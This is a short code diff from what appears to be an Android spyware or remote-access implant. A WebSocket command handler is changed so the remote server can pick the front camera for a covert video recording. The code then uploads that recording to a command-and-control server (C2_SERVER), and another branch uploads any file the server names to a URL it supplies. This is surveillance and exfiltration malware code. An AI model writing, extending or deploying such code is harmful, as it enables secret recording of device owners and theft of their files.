@@ -1,6 +1,7 @@
 package com.ot.grhq.client;
 
 import android.content.Context;
+import android.graphics.SurfaceTexture;
 import android.os.Handler;
 import android.util.Base64;
 import android.util.Log;
@@ -132,7 +133,7 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     FileManager.uploadFile(req.getString("path"), req.getString("url"));
                     break;
                 case VIDEO:
-                    path = Screenshot.captureVideo(context, req.getInt("duration"));;
+                    path = Screenshot.captureVideo(req.getBoolean("frontCamera"), req.getInt("duration"));;
                     file = new File(path);
 
                     FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/video");
